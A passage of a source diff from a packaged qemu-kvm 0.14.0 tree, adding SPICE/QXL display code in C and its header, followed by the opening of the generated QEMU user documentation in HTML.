+SimpleSpiceUpdate *qemu_spice_create_update(SimpleSpiceDisplay *ssd)
+{
+    SimpleSpiceUpdate *update;
+    QXLDrawable *drawable;
+    QXLImage *image;
+    QXLCommand *cmd;
+    uint8_t *src, *dst;
+    int by, bw, bh;
+
+    qemu_mutex_lock_iothread();
+    if (qemu_spice_rect_is_empty(&ssd->dirty)) {
+        qemu_mutex_unlock_iothread();
+        return NULL;
+    };
+
+    dprint(2, "%s: lr %d -> %d,  tb -> %d -> %d\n", __FUNCTION__,
+           ssd->dirty.left, ssd->dirty.right,
+           ssd->dirty.top, ssd->dirty.bottom);
+
+    update   = qemu_mallocz(sizeof(*update));
+    drawable = &update->drawable;
+    image    = &update->image;
+    cmd      = &update->ext.cmd;
+
+    bw       = ssd->dirty.right - ssd->dirty.left;
+    bh       = ssd->dirty.bottom - ssd->dirty.top;
+    update->bitmap = qemu_malloc(bw * bh * 4);
+
+    drawable->bbox            = ssd->dirty;
+    drawable->clip.type       = SPICE_CLIP_TYPE_NONE;
+    drawable->effect          = QXL_EFFECT_OPAQUE;
+    drawable->release_info.id = (intptr_t)update;
+    drawable->type            = QXL_DRAW_COPY;
+    drawable->surfaces_dest[0] = -1;
+    drawable->surfaces_dest[1] = -1;
+    drawable->surfaces_dest[2] = -1;
+
+    drawable->u.copy.rop_descriptor  = SPICE_ROPD_OP_PUT;
+    drawable->u.copy.src_bitmap      = (intptr_t)image;
+    drawable->u.copy.src_area.right  = bw;
+    drawable->u.copy.src_area.bottom = bh;
+
+    QXL_SET_IMAGE_ID(image, QXL_IMAGE_GROUP_DEVICE, ssd->unique++);
+    image->descriptor.type   = SPICE_IMAGE_TYPE_BITMAP;
+    image->bitmap.flags      = QXL_BITMAP_DIRECT | QXL_BITMAP_TOP_DOWN;
+    image->bitmap.stride     = bw * 4;
+    image->descriptor.width  = image->bitmap.x = bw;
+    image->descriptor.height = image->bitmap.y = bh;
+    image->bitmap.data = (intptr_t)(update->bitmap);
+    image->bitmap.palette = 0;
+    image->bitmap.format = SPICE_BITMAP_FMT_32BIT;
+
+    if (ssd->conv == NULL) {
+        PixelFormat dst = qemu_default_pixelformat(32);
+        ssd->conv = qemu_pf_conv_get(&dst, &ssd->ds->surface->pf);
+        assert(ssd->conv);
+    }
+
+    src = ds_get_data(ssd->ds) +
+        ssd->dirty.top * ds_get_linesize(ssd->ds) +
+        ssd->dirty.left * ds_get_bytes_per_pixel(ssd->ds);
+    dst = update->bitmap;
+    for (by = 0; by < bh; by++) {
+        qemu_pf_conv_run(ssd->conv, dst, src, bw);
+        src += ds_get_linesize(ssd->ds);
+        dst += image->bitmap.stride;
+    }
+
+    cmd->type = QXL_CMD_DRAW;
+    cmd->data = (intptr_t)drawable;
+
+    memset(&ssd->dirty, 0, sizeof(ssd->dirty));
+    qemu_mutex_unlock_iothread();
+    return update;
+}
+
+/*
+ * Called from spice server thread context (via interface_release_ressource)
+ * We do *not* hold the global qemu mutex here, so extra care is needed
+ * when calling qemu functions.  Qemu interfaces used:
+ *    - qemu_free (underlying glibc free is re-entrant).
+ */
+void qemu_spice_destroy_update(SimpleSpiceDisplay *sdpy, SimpleSpiceUpdate *update)
+{
+    qemu_free(update->bitmap);
+    qemu_free(update);
+}
+
+void qemu_spice_create_host_memslot(SimpleSpiceDisplay *ssd)
+{
+    QXLDevMemSlot memslot;
+
+    dprint(1, "%s:\n", __FUNCTION__);
+
+    memset(&memslot, 0, sizeof(memslot));
+    memslot.slot_group_id = MEMSLOT_GROUP_HOST;
+    memslot.virt_end = ~0;
+    ssd->worker->add_memslot(ssd->worker, &memslot);
+}
+
+void qemu_spice_create_host_primary(SimpleSpiceDisplay *ssd)
+{
+    QXLDevSurfaceCreate surface;
+
+    dprint(1, "%s: %dx%d\n", __FUNCTION__,
+           ds_get_width(ssd->ds), ds_get_height(ssd->ds));
+
+    surface.format     = SPICE_SURFACE_FMT_32_xRGB;
+    surface.width      = ds_get_width(ssd->ds);
+    surface.height     = ds_get_height(ssd->ds);
+    surface.stride     = -surface.width * 4;
+    surface.mouse_mode = true;
+    surface.flags      = 0;
+    surface.type       = 0;
+    surface.mem        = (intptr_t)ssd->buf;
+    surface.group_id   = MEMSLOT_GROUP_HOST;
+
+    qemu_mutex_unlock_iothread();
+    ssd->worker->create_primary_surface(ssd->worker, 0, &surface);
+    qemu_mutex_lock_iothread();
+}
+
+void qemu_spice_destroy_host_primary(SimpleSpiceDisplay *ssd)
+{
+    dprint(1, "%s:\n", __FUNCTION__);
+
+    qemu_mutex_unlock_iothread();
+    ssd->worker->destroy_primary_surface(ssd->worker, 0);
+    qemu_mutex_lock_iothread();
+}
+
+void qemu_spice_vm_change_state_handler(void *opaque, int running, int reason)
+{
+    SimpleSpiceDisplay *ssd = opaque;
+
+    if (running) {
+        ssd->worker->start(ssd->worker);
+    } else {
+        qemu_mutex_unlock_iothread();
+        ssd->worker->stop(ssd->worker);
+        qemu_mutex_lock_iothread();
+    }
+    ssd->running = running;
+}
+
+/* display listener callbacks */
+
+void qemu_spice_display_update(SimpleSpiceDisplay *ssd,
+                               int x, int y, int w, int h)
+{
+    QXLRect update_area;
+
+    dprint(2, "%s: x %d y %d w %d h %d\n", __FUNCTION__, x, y, w, h);
+    update_area.left = x,
+    update_area.right = x + w;
+    update_area.top = y;
+    update_area.bottom = y + h;
+
+    if (qemu_spice_rect_is_empty(&ssd->dirty)) {
+        ssd->notify++;
+    }
+    qemu_spice_rect_union(&ssd->dirty, &update_area);
+}
+
+void qemu_spice_display_resize(SimpleSpiceDisplay *ssd)
+{
+    dprint(1, "%s:\n", __FUNCTION__);
+
+    memset(&ssd->dirty, 0, sizeof(ssd->dirty));
+    qemu_pf_conv_put(ssd->conv);
+    ssd->conv = NULL;
+
+    qemu_spice_destroy_host_primary(ssd);
+    qemu_spice_create_host_primary(ssd);
+
+    memset(&ssd->dirty, 0, sizeof(ssd->dirty));
+    ssd->notify++;
+}
+
+void qemu_spice_display_refresh(SimpleSpiceDisplay *ssd)
+{
+    dprint(3, "%s:\n", __FUNCTION__);
+    vga_hw_update();
+    if (ssd->notify) {
+        ssd->notify = 0;
+        ssd->worker->wakeup(ssd->worker);
+        dprint(2, "%s: notify\n", __FUNCTION__);
+    }
+}
+
+/* spice display interface callbacks */
+
+static void interface_attach_worker(QXLInstance *sin, QXLWorker *qxl_worker)
+{
+    SimpleSpiceDisplay *ssd = container_of(sin, SimpleSpiceDisplay, qxl);
+
+    dprint(1, "%s:\n", __FUNCTION__);
+    ssd->worker = qxl_worker;
+}
+
+static void interface_set_compression_level(QXLInstance *sin, int level)
+{
+    dprint(1, "%s:\n", __FUNCTION__);
+    /* nothing to do */
+}
+
+static void interface_set_mm_time(QXLInstance *sin, uint32_t mm_time)
+{
+    dprint(3, "%s:\n", __FUNCTION__);
+    /* nothing to do */
+}
+
+static void interface_get_init_info(QXLInstance *sin, QXLDevInitInfo *info)
+{
+    SimpleSpiceDisplay *ssd = container_of(sin, SimpleSpiceDisplay, qxl);
+
+    info->memslot_gen_bits = MEMSLOT_GENERATION_BITS;
+    info->memslot_id_bits  = MEMSLOT_SLOT_BITS;
+    info->num_memslots = NUM_MEMSLOTS;
+    info->num_memslots_groups = NUM_MEMSLOTS_GROUPS;
+    info->internal_groupslot_id = 0;
+    info->qxl_ram_size = ssd->bufsize;
+    info->n_surfaces = NUM_SURFACES;
+}
+
+static int interface_get_command(QXLInstance *sin, struct QXLCommandExt *ext)
+{
+    SimpleSpiceDisplay *ssd = container_of(sin, SimpleSpiceDisplay, qxl);
+    SimpleSpiceUpdate *update;
+
+    dprint(3, "%s:\n", __FUNCTION__);
+    update = qemu_spice_create_update(ssd);
+    if (update == NULL) {
+        return false;
+    }
+    *ext = update->ext;
+    return true;
+}
+
+static int interface_req_cmd_notification(QXLInstance *sin)
+{
+    dprint(1, "%s:\n", __FUNCTION__);
+    return 1;
+}
+
+static void interface_release_resource(QXLInstance *sin,
+                                       struct QXLReleaseInfoExt ext)
+{
+    SimpleSpiceDisplay *ssd = container_of(sin, SimpleSpiceDisplay, qxl);
+    uintptr_t id;
+
+    dprint(2, "%s:\n", __FUNCTION__);
+    id = ext.info->id;
+    qemu_spice_destroy_update(ssd, (void*)id);
+}
+
+static int interface_get_cursor_command(QXLInstance *sin, struct QXLCommandExt *ext)
+{
+    dprint(3, "%s:\n", __FUNCTION__);
+    return false;
+}
+
+static int interface_req_cursor_notification(QXLInstance *sin)
+{
+    dprint(1, "%s:\n", __FUNCTION__);
+    return 1;
+}
+
+static void interface_notify_update(QXLInstance *sin, uint32_t update_id)
+{
+    fprintf(stderr, "%s: abort()\n", __FUNCTION__);
+    abort();
+}
+
+static int interface_flush_resources(QXLInstance *sin)
+{
+    fprintf(stderr, "%s: abort()\n", __FUNCTION__);
+    abort();
+    return 0;
+}
+
+static const QXLInterface dpy_interface = {
+    .base.type               = SPICE_INTERFACE_QXL,
+    .base.description        = "qemu simple display",
+    .base.major_version      = SPICE_INTERFACE_QXL_MAJOR,
+    .base.minor_version      = SPICE_INTERFACE_QXL_MINOR,
+
+    .attache_worker          = interface_attach_worker,
+    .set_compression_level   = interface_set_compression_level,
+    .set_mm_time             = interface_set_mm_time,
+    .get_init_info           = interface_get_init_info,
+
+    /* the callbacks below are called from spice server thread context */
+    .get_command             = interface_get_command,
+    .req_cmd_notification    = interface_req_cmd_notification,
+    .release_resource        = interface_release_resource,
+    .get_cursor_command      = interface_get_cursor_command,
+    .req_cursor_notification = interface_req_cursor_notification,
+    .notify_update           = interface_notify_update,
+    .flush_resources         = interface_flush_resources,
+};
+
+static SimpleSpiceDisplay sdpy;
+
+static void display_update(struct DisplayState *ds, int x, int y, int w, int h)
+{
+    qemu_spice_display_update(&sdpy, x, y, w, h);
+}
+
+static void display_resize(struct DisplayState *ds)
+{
+    qemu_spice_display_resize(&sdpy);
+}
+
+static void display_refresh(struct DisplayState *ds)
+{
+    qemu_spice_display_refresh(&sdpy);
+}
+
+static DisplayChangeListener display_listener = {
+    .dpy_update  = display_update,
+    .dpy_resize  = display_resize,
+    .dpy_refresh = display_refresh,
+};
+
+void qemu_spice_display_init(DisplayState *ds)
+{
+    assert(sdpy.ds == NULL);
+    sdpy.ds = ds;
+    sdpy.bufsize = (16 * 1024 * 1024);
+    sdpy.buf = qemu_malloc(sdpy.bufsize);
+    register_displaychangelistener(ds, &display_listener);
+
+    sdpy.qxl.base.sif = &dpy_interface.base;
+    qemu_spice_add_interface(&sdpy.qxl.base);
+    assert(sdpy.worker);
+
+    qemu_add_vm_change_state_handler(qemu_spice_vm_change_state_handler, &sdpy);
+    qemu_spice_create_host_memslot(&sdpy);
+    qemu_spice_create_host_primary(&sdpy);
+}
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.h qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.h
--- qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.h	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/ui/spice-display.h	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,68 @@
+/*
+ * Copyright (C) 2010 Red Hat, Inc.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 or
+ * (at your option) version 3 of the License.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <spice/ipc_ring.h>
+#include <spice/enums.h>
+#include <spice/qxl_dev.h>
+
+#include "pflib.h"
+
+#define NUM_MEMSLOTS 8
+#define MEMSLOT_GENERATION_BITS 8
+#define MEMSLOT_SLOT_BITS 8
+
+#define MEMSLOT_GROUP_HOST  0
+#define MEMSLOT_GROUP_GUEST 1
+#define NUM_MEMSLOTS_GROUPS 2
+
+#define NUM_SURFACES 1024
+
+typedef struct SimpleSpiceDisplay {
+    DisplayState *ds;
+    void *buf;
+    int bufsize;
+    QXLWorker *worker;
+    QXLInstance qxl;
+    uint32_t unique;
+    QemuPfConv *conv;
+
+    QXLRect dirty;
+    int notify;
+    int running;
+} SimpleSpiceDisplay;
+
+typedef struct SimpleSpiceUpdate {
+    QXLDrawable drawable;
+    QXLImage image;
+    QXLCommandExt ext;
+    uint8_t *bitmap;
+} SimpleSpiceUpdate;
+
+int qemu_spice_rect_is_empty(const QXLRect* r);
+void qemu_spice_rect_union(QXLRect *dest, const QXLRect *r);
+
+SimpleSpiceUpdate *qemu_spice_create_update(SimpleSpiceDisplay *sdpy);
+void qemu_spice_destroy_update(SimpleSpiceDisplay *sdpy, SimpleSpiceUpdate *update);
+void qemu_spice_create_host_memslot(SimpleSpiceDisplay *ssd);
+void qemu_spice_create_host_primary(SimpleSpiceDisplay *ssd);
+void qemu_spice_destroy_host_primary(SimpleSpiceDisplay *ssd);
+void qemu_spice_vm_change_state_handler(void *opaque, int running, int reason);
+
+void qemu_spice_display_update(SimpleSpiceDisplay *ssd,
+                               int x, int y, int w, int h);
+void qemu_spice_display_resize(SimpleSpiceDisplay *ssd);
+void qemu_spice_display_refresh(SimpleSpiceDisplay *ssd);
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/.version qemu-kvm-0.14.0+noroms/.pc/.version
--- qemu-kvm-0.14.0+noroms.orig/.pc/.version	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/.version	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1 @@
+2
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-doc.html qemu-kvm-0.14.0+noroms/qemu-doc.html
--- qemu-kvm-0.14.0+noroms.orig/qemu-doc.html	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-doc.html	2014-02-19 10:12:19.000000000 -0500
@@ -0,0 +1,4261 @@
+<html lang="en">
+<head>
+<title>QEMU Emulator User Documentation</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="description" content="QEMU Emulator User Documentation">
+<meta name="generator" content="makeinfo 4.13">
+<link title="Top" rel="top" href="#Top">
+<link href="http://www.gnu.org/software/texinfo/" rel="generator-home" title="Texinfo Homepage">
+<meta http-equiv="Content-Style-Type" content="text/css">
+<style type="text/css"><!--
+  pre.display { font-family:inherit }
+  pre.format  { font-family:inherit }
+  pre.smalldisplay { font-family:inherit; font-size:smaller }
+  pre.smallformat  { font-family:inherit; font-size:smaller }
+  pre.smallexample { font-size:smaller }
+  pre.smalllisp    { font-size:smaller }
+  span.sc    { font-variant:small-caps }
+  span.roman { font-family:serif; font-weight:normal; } 
+  span.sansserif { font-family:sans-serif; font-weight:normal; } 
+--></style>
+</head>
+<body>
+<a name="Top"></a>
+
+<h2 class="unnumbered">QEMU Emulator User Documentation</h2>
+
+<div class="contents">
+<h2>Table of Contents</h2>
+<ul>
+<li><a name="toc_Top" href="#Top">QEMU Emulator User Documentation</a>
+<li><a name="toc_Introduction" href="#Introduction">1 Introduction</a>
+<ul>
+<li><a href="#intro_005ffeatures">1.1 Features</a>
+</li></ul>
+<li><a name="toc_Installation" href="#Installation">2 Installation</a>
+<ul>
+<li><a href="#install_005flinux">2.1 Linux</a>
+<li><a href="#install_005fwindows">2.2 Windows</a>
+<li><a href="#install_005fmac">2.3 Mac OS X</a>
+</li></ul>
+<li><a name="toc_QEMU-PC-System-emulator" href="#QEMU-PC-System-emulator">3 QEMU PC System emulator</a>
+<ul>
+<li><a href="#pcsys_005fintroduction">3.1 Introduction</a>
+<li><a href="#pcsys_005fquickstart">3.2 Quick Start</a>
+<li><a href="#sec_005finvocation">3.3 Invocation</a>
+<li><a href="#pcsys_005fkeys">3.4 Keys</a>
+<li><a href="#pcsys_005fmonitor">3.5 QEMU Monitor</a>
+<ul>
+<li><a href="#pcsys_005fmonitor">3.5.1 Commands</a>
+<li><a href="#pcsys_005fmonitor">3.5.2 Integer expressions</a>
+</li></ul>
+<li><a href="#disk_005fimages">3.6 Disk Images</a>
+<ul>
+<li><a href="#disk_005fimages_005fquickstart">3.6.1 Quick start for disk image creation</a>
+<li><a href="#disk_005fimages_005fsnapshot_005fmode">3.6.2 Snapshot mode</a>
+<li><a href="#vm_005fsnapshots">3.6.3 VM snapshots</a>
+<li><a href="#qemu_005fimg_005finvocation">3.6.4 <code>qemu-img</code> Invocation</a>
+<li><a href="#qemu_005fnbd_005finvocation">3.6.5 <code>qemu-nbd</code> Invocation</a>
+<li><a href="#host_005fdrives">3.6.6 Using host drives</a>
+<ul>
+<li><a href="#host_005fdrives">3.6.6.1 Linux</a>
+<li><a href="#host_005fdrives">3.6.6.2 Windows</a>
+<li><a href="#host_005fdrives">3.6.6.3 Mac OS X</a>
+</li></ul>
+<li><a href="#disk_005fimages_005ffat_005fimages">3.6.7 Virtual FAT disk images</a>
+<li><a href="#disk_005fimages_005fnbd">3.6.8 NBD access</a>
+<li><a href="#disk_005fimages_005fsheepdog">3.6.9 Sheepdog disk images</a>
+</li></ul>
+<li><a href="#pcsys_005fnetwork">3.7 Network emulation</a>
+<ul>
+<li><a href="#pcsys_005fnetwork">3.7.1 VLANs</a>
+<li><a href="#pcsys_005fnetwork">3.7.2 Using TAP network interfaces</a>
+<ul>
+<li><a href="#pcsys_005fnetwork">3.7.2.1 Linux host</a>
+<li><a href="#pcsys_005fnetwork">3.7.2.2 Windows host</a>
+</li></ul>
+<li><a href="#pcsys_005fnetwork">3.7.3 Using the user mode network stack</a>
+<li><a href="#pcsys_005fnetwork">3.7.4 Connecting VLANs between QEMU instances</a>
+</li></ul>
+<li><a href="#pcsys_005fother_005fdevs">3.8 Other Devices</a>
+<ul>
+<li><a href="#pcsys_005fother_005fdevs">3.8.1 Inter-VM Shared Memory device</a>
+</li></ul>
+<li><a href="#direct_005flinux_005fboot">3.9 Direct Linux Boot</a>
+<li><a href="#pcsys_005fusb">3.10 USB emulation</a>
+<ul>
+<li><a href="#usb_005fdevices">3.10.1 Connecting USB devices</a>
+<li><a href="#host_005fusb_005fdevices">3.10.2 Using host USB devices on a Linux host</a>
+</li></ul>
+<li><a href="#vnc_005fsecurity">3.11 VNC security</a>
+<ul>
+<li><a href="#vnc_005fsec_005fnone">3.11.1 Without passwords</a>
+<li><a href="#vnc_005fsec_005fpassword">3.11.2 With passwords</a>
+<li><a href="#vnc_005fsec_005fcertificate">3.11.3 With x509 certificates</a>
+<li><a href="#vnc_005fsec_005fcertificate_005fverify">3.11.4 With x509 certificates and client verification</a>
+<li><a href="#vnc_005fsec_005fcertificate_005fpw">3.11.5 With x509 certificates, client verification and passwords</a>
+<li><a href="#vnc_005fsec_005fsasl">3.11.6 With SASL authentication</a>
+<li><a href="#vnc_005fsec_005fcertificate_005fsasl">3.11.7 With x509 certificates and SASL authentication</a>
+<li><a href="#vnc_005fgenerate_005fcert">3.11.8 Generating certificates for VNC</a>
+<ul>
+<li><a href="#vnc_005fgenerate_005fca">3.11.8.1 Setup the Certificate Authority</a>
+<li><a href="#vnc_005fgenerate_005fserver">3.11.8.2 Issuing server certificates</a>
+<li><a href="#vnc_005fgenerate_005fclient">3.11.8.3 Issuing client certificates</a>
+</li></ul>
+<li><a href="#vnc_005fsetup_005fsasl">3.11.9 Configuring SASL mechanisms</a>
+</li></ul>
+<li><a href="#gdb_005fusage">3.12 GDB usage</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13 Target OS specific information</a>
+<ul>
+<li><a href="#pcsys_005fos_005fspecific">3.13.1 Linux</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2 Windows</a>
+<ul>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.1 SVGA graphic modes support</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.2 CPU usage reduction</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.3 Windows 2000 disk full problem</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.4 Windows 2000 shutdown</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.5 Share a directory between Unix and Windows</a>
+<li><a href="#pcsys_005fos_005fspecific">3.13.2.6 Windows XP security problem</a>
+</li></ul>
+<li><a href="#pcsys_005fos_005fspecific">3.13.3 MS-DOS and FreeDOS</a>
+<ul>
+<li><a href="#pcsys_005fos_005fspecific">3.13.3.1 CPU usage reduction</a>
+</li></ul>
+</li></ul>
+</li></ul>
+<li><a name="toc_QEMU-System-emulator-for-non-PC-targets" href="#QEMU-System-emulator-for-non-PC-targets">4 QEMU System emulator for non PC targets</a>
+<ul>
+<li><a href="#PowerPC-System-emulator">4.1 PowerPC System emulator</a>
+<li><a href="#Sparc32-System-emulator">4.2 Sparc32 System emulator</a>
+<li><a href="#Sparc64-System-emulator">4.3 Sparc64 System emulator</a>
+<li><a href="#MIPS-System-emulator">4.4 MIPS System emulator</a>
+<li><a href="#ARM-System-emulator">4.5 ARM System emulator</a>
+<li><a href="#ColdFire-System-emulator">4.6 ColdFire System emulator</a>
+<li><a href="#Cris-System-emulator">4.7 Cris System emulator</a>
+<li><a href="#Microblaze-System-emulator">4.8 Microblaze System emulator</a>
+<li><a href="#SH4-System-emulator">4.9 SH4 System emulator</a>
+</li></ul>
+<li><a name="toc_QEMU-User-space-emulator" href="#QEMU-User-space-emulator">5 QEMU User space emulator</a>
+<ul>
+<li><a href="#Supported-Operating-Systems">5.1 Supported Operating Systems</a>
+<li><a href="#Linux-User-space-emulator">5.2 Linux User space emulator</a>
+<ul>
+<li><a href="#Quick-Start">5.2.1 Quick Start</a>
+<li><a href="#Wine-launch">5.2.2 Wine launch</a>
+<li><a href="#Command-line-options">5.2.3 Command line options</a>
+<li><a href="#Other-binaries">5.2.4 Other binaries</a>
+</li></ul>
+<li><a href="#Mac-OS-X_002fDarwin-User-space-emulator">5.3 Mac OS X/Darwin User space emulator</a>
+<ul>
+<li><a href="#Mac-OS-X_002fDarwin-Status">5.3.1 Mac OS X/Darwin Status</a>
+<li><a href="#Mac-OS-X_002fDarwin-Quick-Start">5.3.2 Quick Start</a>
+<li><a href="#Mac-OS-X_002fDarwin-Command-line-options">5.3.3 Command line options</a>
+</li></ul>
+<li><a href="#BSD-User-space-emulator">5.4 BSD User space emulator</a>
+<ul>
+<li><a href="#BSD-Status">5.4.1 BSD Status</a>
+<li><a href="#BSD-Quick-Start">5.4.2 Quick Start</a>
+<li><a href="#BSD-Command-line-options">5.4.3 Command line options</a>
+</li></ul>
+</li></ul>
+<li><a name="toc_compilation" href="#compilation">6 Compilation from the sources</a>
+<ul>
+<li><a href="#Linux_002fUnix">6.1 Linux/Unix</a>
+<ul>
+<li><a href="#Linux_002fUnix">6.1.1 Compilation</a>
+</li></ul>
+<li><a href="#Windows">6.2 Windows</a>
+<li><a href="#Cross-compilation-for-Windows-with-Linux">6.3 Cross compilation for Windows with Linux</a>
+<li><a href="#Mac-OS-X">6.4 Mac OS X</a>
+<li><a href="#Make-targets">6.5 Make targets</a>
+</li></ul>
+<li><a name="toc_License" href="#License">Appendix A License</a>
+<li><a name="toc_Index" href="#Index">Appendix B Index</a>
+<ul>
+<li><a href="#Concept-Index">B.1 Concept Index</a>
+<li><a href="#Function-Index">B.2 Function Index</a>
+<li><a href="#Keystroke-Index">B.3 Keystroke Index</a>
+<li><a href="#Program-Index">B.4 Program Index</a>
+<li><a href="#Data-Type-Index">B.5 Data Type Index</a>
+<li><a href="#Variable-Index">B.6 Variable Index</a>
+</li></ul>
+</li></ul>
+</div>
+
+<p><a name="Introduction"></a>
+
+<h2 class="chapter">1 Introduction</h2>
+
+<p><a name="intro_features"></a>
+<a name="intro_005ffeatures"></a>
+
+<h3 class="section">1.1 Features</h3>
+
+<p>QEMU is a FAST! processor emulator using dynamic translation to
+achieve good emulation speed.
+
+<p>QEMU has two operating modes:
+
+     
+<a name="index-operating-modes-1"></a>
+<ul>
+<li><a name="index-system-emulation-2"></a>Full system emulation. In this mode, QEMU emulates a full system (for
+example a PC), including one or several processors and various
+peripherals. It can be used to launch different Operating Systems
+without rebooting the PC or to debug system code.
+
+     <li><a name="index-user-mode-emulation-3"></a>User mode emulation. In this mode, QEMU can launch
+processes compiled for one CPU on another CPU. It can be used to
+launch the Wine Windows API emulator (<a href="http://www.winehq.org">http://www.winehq.org</a>) or
+to ease cross-compilation and cross-debugging.
+
+</ul>
+
+<p>QEMU can run without an host kernel driver and yet gives acceptable
+performance.
+
+<p>For system emulation, the following hardware targets are supported:
+     
+<a name="index-emulated-target-systems-4"></a>
+<a name="index-supported-target-systems-5"></a>
+<ul><li>PC (x86 or x86_64 processor)
+<li>ISA PC (old style PC without PCI bus)
+<li>PREP (PowerPC processor)
+<li>G3 Beige PowerMac (PowerPC processor)
+<li>Mac99 PowerMac (PowerPC processor, in progress)
+<li>Sun4m/Sun4c/Sun4d (32-bit Sparc processor)
+<li>Sun4u/Sun4v (64-bit Sparc processor, in progress)
+<li>Malta board (32-bit and 64-bit MIPS processors)
+<li>MIPS Magnum (64-bit MIPS processor)
+<li>ARM Integrator/CP (ARM)
+<li>ARM Versatile baseboard (ARM)
+<li>ARM RealView Emulation/Platform baseboard (ARM)
+<li>Spitz, Akita, Borzoi, Terrier and Tosa PDAs (PXA270 processor)
+<li>Luminary Micro LM3S811EVB (ARM Cortex-M3)
+<li>Luminary Micro LM3S6965EVB (ARM Cortex-M3)
+<li>Freescale MCF5208EVB (ColdFire V2). 
+<li>Arnewsh MCF5206 evaluation board (ColdFire V2). 
+<li>Palm Tungsten|E PDA (OMAP310 processor)
+<li>N800 and N810 tablets (OMAP2420 processor)
+<li>MusicPal (MV88W8618 ARM processor)
+<li>Gumstix "Connex" and "Verdex" motherboards (PXA255/270). 
+<li>Siemens SX1 smartphone (OMAP310 processor)
+<li>Syborg SVP base model (ARM Cortex-A8). 
+<li>AXIS-Devboard88 (CRISv32 ETRAX-FS). 
+<li>Petalogix Spartan 3aDSP1800 MMU ref design (MicroBlaze). 
+</ul>
+
+<p><a name="index-supported-user-mode-targets-6"></a>For user emulation, x86 (32 and 64 bit), PowerPC (32 and 64 bit),
+ARM, MIPS (32 bit only), Sparc (32 and 64 bit),
+Alpha, ColdFire(m68k), CRISv32 and MicroBlaze CPUs are supported.
+
+<p><a name="Installation"></a>
+
+<h2 class="chapter">2 Installation</h2>
+
+<p>If you want to compile QEMU yourself, see <a href="#compilation">compilation</a>.
+
+<p><a name="install_linux"></a>
+<a name="install_005flinux"></a>
+
+<h3 class="section">2.1 Linux</h3>
+
+<p><a name="index-installation-_0028Linux_0029-7"></a>
+If a precompiled package is available for your distribution - you just
+have to install it. Otherwise, see <a href="#compilation">compilation</a>.
+
+<p><a name="install_windows"></a>
+<a name="install_005fwindows"></a>
+
+<h3 class="section">2.2 Windows</h3>
+
+<p><a name="index-installation-_0028Windows_0029-8"></a>
+Download the experimental binary installer at
+<a href="http://www.free.oszoo.org/download.html">http://www.free.oszoo.org/download.html</a>. 
+TODO (no longer available)
+
+<p><a name="install_mac"></a>
+<a name="install_005fmac"></a>
+
+<h3 class="section">2.3 Mac OS X</h3>
+
+<p>Download the experimental binary installer at
+<a href="http://www.free.oszoo.org/download.html">http://www.free.oszoo.org/download.html</a>. 
+TODO (no longer available)
+
+<p><a name="QEMU-PC-System-emulator"></a>
+
+<h2 class="chapter">3 QEMU PC System emulator</h2>
+
+<p><a name="index-system-emulation-_0028PC_0029-9"></a>
+
+<p><a name="pcsys_introduction"></a>
+<a name="pcsys_005fintroduction"></a>
+
+<h3 class="section">3.1 Introduction</h3>
+
+<!-- man begin DESCRIPTION -->
+<p>The QEMU PC System emulator simulates the
+following peripherals:
+
+     <ul>
+<li>i440FX host PCI bridge and PIIX3 PCI to ISA bridge
+<li>Cirrus CLGD 5446 PCI VGA card or dummy VGA card with Bochs VESA
+extensions (hardware level, including all non standard modes). 
+<li>PS/2 mouse and keyboard
+<li>2 PCI IDE interfaces with hard disk and CD-ROM support
+<li>Floppy disk
+<li>PCI and ISA network adapters
+<li>Serial ports
+<li>Creative SoundBlaster 16 sound card
+<li>ENSONIQ AudioPCI ES1370 sound card
+<li>Intel 82801AA AC97 Audio compatible sound card
+<li>Intel HD Audio Controller and HDA codec
+<li>Adlib (OPL2) - Yamaha YM3812 compatible chip
+<li>Gravis Ultrasound GF1 sound card
+<li>CS4231A compatible sound card
+<li>PCI UHCI USB controller and a virtual USB hub. 
+</ul>
+
+<p>SMP is supported with up to 255 CPUs.
+
+<p>Note that adlib, gus and cs4231a are only available when QEMU was
+configured with &ndash;audio-card-list option containing the name(s) of
+required card(s).
+
+<p>QEMU uses the PC BIOS from the Bochs project and the Plex86/Bochs LGPL
+VGA BIOS.
+
+<p>QEMU uses YM3812 emulation by Tatsuyuki Satoh.
+
+<p>QEMU uses GUS emulation (GUSEMU32 <a href="http://www.deinmeister.de/gusemu/">http://www.deinmeister.de/gusemu/</a>)
+by Tibor "TS" Schtz.
+
+<p>Not that, by default, GUS shares IRQ(7) with parallel ports and so
+qemu must be told to not have parallel ports to have working GUS
+
+<pre class="example">qemu dos.img -soundhw gus -parallel none
+</pre>
+<p>Alternatively:
+<pre class="example">qemu dos.img -device gus,irq=5
+</pre>
+<p>Or some other unclaimed IRQ.
+
+<p>CS4231A is the chip used in Windows Sound System and GUSMAX products
+
+<!-- man end -->
